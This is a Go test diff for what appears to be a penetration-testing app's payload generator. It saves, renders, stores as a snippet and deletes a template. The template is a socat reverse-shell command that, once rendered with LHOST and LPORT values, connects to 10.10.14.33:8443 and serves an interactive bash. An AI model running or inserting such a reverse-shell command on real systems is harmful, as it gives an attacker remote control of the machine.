@@ -2409,3 +2409,116 @@ func TestApp_SnippetChains_F16(t *testing.T) {
 	}
 }
 
+func TestApp_PayloadGenerator_F33(t *testing.T) {
+	tmpVault := filepath.Join(t.TempDir(), "test_payload_vault.vault")
+	store := vault.NewStore(vault.StoreOptions{FilePath: tmpVault})
+	if err := store.Initialize(context.Background(), ""); err != nil {
+		t.Fatalf("store.Initialize failed: %v", err)
+	}
+
+	app := NewAppWithDependencies(newFakeSshTransport(), nil, store, nil)
+	app.ctx = context.Background()
+
+	// 1. Configure external payload templates path
+	tmpPayloadFile := filepath.Join(t.TempDir(), "payloads_custom.json")
+	cfg, err := app.SetPayloadTemplatesPath(tmpPayloadFile)
+	if err != nil {
+		t.Fatalf("SetPayloadTemplatesPath failed: %v", err)
+	}
+	if !cfg.Exists {
+		t.Errorf("expected external file to exist")
+	}
+	if cfg.TemplateCount != 0 {
+		t.Errorf("expected 0 templates initially, got %d", cfg.TemplateCount)
+	}
+
+	// 2. Save a custom template into the external file
+	testTmpl := core.PayloadTemplate{
+		ID:          "tmpl-socat-reverse",
+		Name:        "Socat Interactive TTY Reverse",
+		OS:          "linux",
+		Shell:       "socat",
+		Kind:        "reverse",
+		Command:     "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{{LHOST}}:{{LPORT}}",
+		DefaultPort: 443,
+		Tags:        []string{"interactive", "tty"},
+	}
+
+	if err := app.SavePayloadTemplate(testTmpl); err != nil {
+		t.Fatalf("SavePayloadTemplate failed: %v", err)
+	}
+
+	// 3. Verify loaded from file
+	loaded, err := app.ListPayloadTemplates()
+	if err != nil {
+		t.Fatalf("ListPayloadTemplates failed: %v", err)
+	}
+	if len(loaded) != 1 {
+		t.Fatalf("expected 1 template loaded from external file, got %d", len(loaded))
+	}
+	if loaded[0].ID != "tmpl-socat-reverse" {
+		t.Errorf("unexpected template ID: %s", loaded[0].ID)
+	}
+
+	// 4. Render payload with LHOST and LPORT
+	renderRes, err := app.RenderPayload(core.PayloadRenderOptions{
+		TemplateID: "tmpl-socat-reverse",
+		LHOST:      "10.10.14.33",
+		LPORT:      8443,
+		Encoding:   "none",
+	})
+	if err != nil {
+		t.Fatalf("RenderPayload failed: %v", err)
+	}
+	expectedCmd := "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.33:8443"
+	if renderRes.Rendered != expectedCmd {
+		t.Errorf("expected rendered payload:\n%s\ngot:\n%s", expectedCmd, renderRes.Rendered)
+	}
+
+	// 5. Save rendered payload as Snippet into Vault
+	snip, err := app.SavePayloadAsSnippet(core.PayloadRenderOptions{
+		TemplateID: "tmpl-socat-reverse",
+		LHOST:      "10.10.14.33",
+		LPORT:      8443,
+		Encoding:   "none",
+	}, "Socat Quick Shell")
+	if err != nil {
+		t.Fatalf("SavePayloadAsSnippet failed: %v", err)
+	}
+	if snip.Name != "Socat Quick Shell" {
+		t.Errorf("unexpected snippet name: %s", snip.Name)
+	}
+
+	// Verify snippet exists in vault
+	summary, err := app.GetVaultSummary()
+	if err != nil {
+		t.Fatalf("GetVaultSummary failed: %v", err)
+	}
+	foundSnip := false
+	for _, s := range summary.Snippets {
+		if s.ID == snip.ID {
+			foundSnip = true
+			if s.Body != expectedCmd {
+				t.Errorf("snippet body mismatch: %s", s.Body)
+			}
+			break
+		}
+	}
+	if !foundSnip {
+		t.Errorf("saved snippet not found in vault summary")
+	}
+
+	// 6. Delete template from external file
+	if err := app.DeletePayloadTemplate("tmpl-socat-reverse"); err != nil {
+		t.Fatalf("DeletePayloadTemplate failed: %v", err)
+	}
+	postDelete, err := app.ListPayloadTemplates()
+	if err != nil {
+		t.Fatalf("ListPayloadTemplates post-delete failed: %v", err)
+	}
+	if len(postDelete) != 0 {
+		t.Errorf("expected 0 templates after delete, got %d", len(postDelete))
+	}
+}
+
+
